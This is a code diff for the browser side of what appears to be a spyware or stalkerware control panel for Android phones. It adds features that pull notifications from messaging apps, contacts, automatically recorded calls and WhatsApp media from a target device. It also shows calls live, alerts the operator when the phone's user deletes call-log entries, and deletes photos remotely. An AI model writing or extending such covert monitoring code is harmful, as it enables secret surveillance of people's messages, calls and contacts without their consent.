@@ -123,7 +123,9 @@ function showDeviceActions(deviceId) {
 function updateDeviceSelects() {
   var selects = ['cameraDeviceSelect', 'gpsDeviceSelect', 'galleryDeviceSelect',
                  'filesDeviceSelect', 'calllogDeviceSelect', 'smsDeviceSelect',
-                 'historyDeviceSelect', 'infoDeviceSelect', 'emergencyDeviceSelect'];
+                 'historyDeviceSelect', 'notificationsDeviceSelect', 'contactsDeviceSelect',
+                 'recordingsDeviceSelect', 'whatsappDeviceSelect',
+                 'infoDeviceSelect', 'emergencyDeviceSelect'];
 
   selects.forEach(function(selId) {
     var sel = document.getElementById(selId);
@@ -928,6 +930,289 @@ function escapeHtml(text) {
   div.textContent = text;
   return div.innerHTML;
 }
+
+// ============ NOTIFICATIONS ============
+let notificationsData = [];
+
+function getSelectedNotificationsDevice() {
+  return document.getElementById('notificationsDeviceSelect').value;
+}
+function onNotificationsDeviceChange() {
+  notificationsData = [];
+  updateNotificationsList();
+}
+function fetchNotifications() {
+  var deviceId = getSelectedNotificationsDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:notifications:fetch', { deviceId: deviceId });
+  showToast('Fetching notifications...', 'info');
+}
+
+socket.on('notifications:data', function(data) {
+  if (data.notifications && data.notifications.length > 0) {
+    notificationsData = data.notifications;
+    updateNotificationsList();
+    document.getElementById('notifCount').textContent = notificationsData.length + ' notifications';
+    showToast(notificationsData.length + ' notifications found', 'success');
+  } else {
+    document.getElementById('notifCount').textContent = '';
+    var note = data.note || 'No notifications captured yet';
+    document.getElementById('notificationsList').innerHTML =
+      '<div class="empty-state" style="padding:40px 20px"><div class="icon">🔔</div><h3>No Notifications</h3><p>' + note + '</p></div>';
+  }
+});
+
+// Real-time notification
+socket.on('notification:new', function(data) {
+  notificationsData.unshift(data);
+  updateNotificationsList();
+  showToast('New notification: ' + (data.appName || data.packageName) + ' - ' + data.title, 'info');
+});
+
+function updateNotificationsList() {
+  var list = document.getElementById('notificationsList');
+  if (notificationsData.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">🔔</div><h3>No Notifications</h3><p>Enable Notification Access on device</p></div>';
+    return;
+  }
+  list.innerHTML = '';
+  notificationsData.forEach(function(notif) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    var icon = '🔔';
+    if (notif.category === 'whatsapp') icon = '💬';
+    else if (notif.category === 'call') icon = '📞';
+    else if (notif.category === 'sms') icon = '💬';
+    else if (notif.category === 'instagram') icon = '📷';
+    else if (notif.category === 'telegram') icon = '✈️';
+
+    var time = notif.timestamp ? new Date(notif.timestamp).toLocaleString() : '--';
+    item.innerHTML = '<div class="log-icon">' + icon + '</div>' +
+      '<div class="log-info"><div class="log-title">' + escapeHtml(notif.appName || notif.packageName || '') + '</div>' +
+      '<div class="log-body"><strong>' + escapeHtml(notif.title || '') + '</strong> ' + escapeHtml(notif.text || '') + '</div>' +
+      '<div class="log-meta">' + time + '</div></div>';
+    list.appendChild(item);
+  });
+}
+
+// ============ CONTACTS ============
+let contactsData = [];
+
+function getSelectedContactsDevice() {
+  return document.getElementById('contactsDeviceSelect').value;
+}
+function onContactsDeviceChange() {
+  contactsData = [];
+  updateContactsList();
+}
+function fetchContacts() {
+  var deviceId = getSelectedContactsDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:contacts:fetch', { deviceId: deviceId });
+  showToast('Fetching contacts...', 'info');
+}
+
+socket.on('contacts:data', function(data) {
+  if (data.contacts && data.contacts.length > 0) {
+    contactsData = data.contacts;
+    updateContactsList();
+    document.getElementById('contactsCount').textContent = contactsData.length + ' contacts';
+    showToast(contactsData.length + ' contacts found', 'success');
+  } else {
+    document.getElementById('contactsCount').textContent = '';
+    document.getElementById('contactsList').innerHTML =
+      '<div class="empty-state" style="padding:40px 20px"><div class="icon">👥</div><h3>No Contacts</h3><p>Contacts permission needed</p></div>';
+  }
+});
+
+function updateContactsList() {
+  var list = document.getElementById('contactsList');
+  if (contactsData.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">👥</div><h3>No Contacts</h3><p>Select device and fetch</p></div>';
+    return;
+  }
+  list.innerHTML = '';
+  contactsData.forEach(function(contact) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    item.innerHTML = '<div class="log-icon">👤</div>' +
+      '<div class="log-info"><div class="log-title">' + escapeHtml(contact.name || 'Unknown') + '</div>' +
+      '<div class="log-meta">' + escapeHtml(contact.number || '') + '</div></div>';
+    list.appendChild(item);
+  });
+}
+
+// ============ CALL RECORDINGS ============
+let recordingsData = [];
+
+function getSelectedRecordingsDevice() {
+  return document.getElementById('recordingsDeviceSelect').value;
+}
+function onRecordingsDeviceChange() {
+  recordingsData = [];
+  updateRecordingsList();
+}
+function fetchRecordings() {
+  var deviceId = getSelectedRecordingsDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:recordings:fetch', { deviceId: deviceId });
+  showToast('Fetching recordings...', 'info');
+}
+
+socket.on('recordings:data', function(data) {
+  if (data.recordings && data.recordings.length > 0) {
+    recordingsData = data.recordings;
+    updateRecordingsList();
+    document.getElementById('recordingsCount').textContent = recordingsData.length + ' recordings';
+    showToast(recordingsData.length + ' recordings found', 'success');
+  } else {
+    var note = data.note || 'No recordings yet';
+    document.getElementById('recordingsCount').textContent = '';
+    document.getElementById('recordingsList').innerHTML =
+      '<div class="empty-state" style="padding:40px 20px"><div class="icon">🎙️</div><h3>No Recordings</h3><p>' + note + '</p></div>';
+  }
+});
+
+socket.on('recording:new', function(data) {
+  showToast('New call recording: ' + (data.number || 'unknown') + ' (' + data.duration + 's)', 'success');
+});
+
+function updateRecordingsList() {
+  var list = document.getElementById('recordingsList');
+  if (recordingsData.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">🎙️</div><h3>No Recordings</h3><p>Calls recorded automatically</p></div>';
+    return;
+  }
+  list.innerHTML = '';
+  recordingsData.forEach(function(rec) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    var time = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : '--';
+    var sizeKB = rec.size ? Math.round(rec.size / 1024) + ' KB' : '--';
+    item.innerHTML = '<div class="log-icon">🎙️</div>' +
+      '<div class="log-info"><div class="log-title">' + escapeHtml(rec.name || '') + '</div>' +
+      '<div class="log-meta">' + time + ' | ' + sizeKB + '</div></div>';
+    list.appendChild(item);
+  });
+}
+
+// ============ WHATSAPP MEDIA ============
+let whatsappData = [];
+
+function getSelectedWhatsappDevice() {
+  return document.getElementById('whatsappDeviceSelect').value;
+}
+function onWhatsappDeviceChange() {
+  whatsappData = [];
+  updateWhatsappGrid();
+}
+function fetchWhatsApp() {
+  var deviceId = getSelectedWhatsappDevice();
+  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
+  socket.emit('command:whatsapp:fetch', { deviceId: deviceId });
+  showToast('Fetching WhatsApp media...', 'info');
+}
+
+socket.on('whatsapp:data', function(data) {
+  if (data.media && data.media.length > 0) {
+    whatsappData = data.media;
+    updateWhatsappGrid();
+    document.getElementById('whatsappCount').textContent = whatsappData.length + ' files';
+    showToast(whatsappData.length + ' WhatsApp files found', 'success');
+  } else {
+    var note = data.note || 'No WhatsApp media found';
+    document.getElementById('whatsappCount').textContent = '';
+    document.getElementById('whatsappGrid').innerHTML =
+      '<div class="empty-state" style="padding:40px 20px;grid-column:1/-1"><div class="icon">📱</div><h3>No WhatsApp Media</h3><p>' + note + '</p></div>';
+  }
+});
+
+function updateWhatsappGrid() {
+  var grid = document.getElementById('whatsappGrid');
+  if (whatsappData.length === 0) {
+    grid.innerHTML = '<div class="empty-state" style="padding:60px 20px;grid-column:1/-1"><div class="icon">📱</div><h3>No WhatsApp Media</h3></div>';
+    return;
+  }
+  grid.innerHTML = '';
+  whatsappData.forEach(function(item) {
+    var card = document.createElement('div');
+    card.className = 'gallery-item';
+    if (item.thumbnail) {
+      card.innerHTML = '<img src="' + item.thumbnail + '" alt="' + escapeHtml(item.name) + '" style="width:100%;height:100%;object-fit:cover">';
+    } else {
+      var icon = '📄';
+      if (item.type && item.type.startsWith('image')) icon = '🖼️';
+      else if (item.type && item.type.startsWith('video')) icon = '🎬';
+      else if (item.type && item.type.startsWith('audio')) icon = '🎵';
+      card.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px"><span style="font-size:32px">' + icon + '</span><span style="font-size:11px;color:var(--text-secondary);text-align:center;padding:0 4px;overflow:hidden;text-overflow:ellipsis;max-width:100%">' + escapeHtml(item.name || '') + '</span></div>';
+    }
+    grid.appendChild(card);
+  });
+}
+
+// ============ LIVE CALL MONITORING ============
+socket.on('call:live', function(data) {
+  var icon = '📞';
+  var msg = '';
+  if (data.state === 'ringing') {
+    icon = '📲';
+    msg = 'INCOMING CALL from ' + (data.number || 'Unknown');
+  } else if (data.state === 'answered') {
+    icon = '📱';
+    msg = (data.type === 'outgoing' ? 'OUTGOING' : 'INCOMING') + ' call answered: ' + (data.number || 'Unknown');
+  } else if (data.state === 'ended') {
+    if (data.type === 'missed') {
+      icon = '📵';
+      msg = 'MISSED CALL from ' + (data.number || 'Unknown');
+    } else {
+      icon = '📴';
+      msg = 'Call ended (' + data.type + '): ' + (data.number || 'Unknown');
+    }
+  }
+  showToast(icon + ' ' + msg, data.type === 'missed' ? 'error' : 'info');
+
+  // Add to call log data if on that page
+  if (data.state === 'ended') {
+    callLogData.unshift({
+      number: data.number || 'Unknown',
+      type: data.type,
+      timestamp: data.timestamp,
+      duration: '--',
+      name: ''
+    });
+    updateCallLogList();
+  }
+});
+
+// ============ CALL LOG DELETE DETECTION ============
+socket.on('calllog:deleted', function(data) {
+  var count = data.deletedCount || 0;
+  var msg = '⚠️ ALERT: ' + count + ' call log entries DELETED on device!';
+  showToast(msg, 'error');
+
+  // Show deleted entries if available
+  if (data.deletedEntries && data.deletedEntries.length > 0) {
+    var details = 'Deleted entries:\\n';
+    data.deletedEntries.forEach(function(entry) {
+      var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '';
+      details += '- ' + (entry.name || entry.number || 'Unknown') + ' (' + time + ')\\n';
+    });
+    console.log(details);
+    // Show alert with details
+    setTimeout(function() {
+      showToast('Deleted: ' + data.deletedEntries.map(function(e) { return e.number || 'Unknown'; }).join(', '), 'error');
+    }, 3000);
+  }
+});
+
+// ============ PHOTO DELETE ============
+socket.on('photo:deleted', function(data) {
+  if (data.success) {
+    showToast('Photo deleted successfully', 'success');
+  } else {
+    showToast('Failed to delete photo: ' + (data.error || ''), 'error');
+  }
+});
 
 // ---- Socket Events ----
 socket.on('devices:updated', fetchDevices);
